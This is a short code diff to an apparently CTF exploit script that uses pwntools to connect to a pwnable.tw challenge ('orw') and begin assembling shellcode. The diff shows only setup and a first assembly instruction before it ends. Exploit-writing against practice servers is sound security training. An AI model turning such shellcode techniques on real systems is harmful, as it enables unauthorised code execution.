@@ -1,9 +1,8 @@
 from pwn import *
 
 server = remote('chall.pwnable.tw', 10001)
-#server = gdb.debug('./orw')
 
-server.read()
+print(server.read())
 
 shellcode = ''
 shellcode += asm('xor eax, eax')
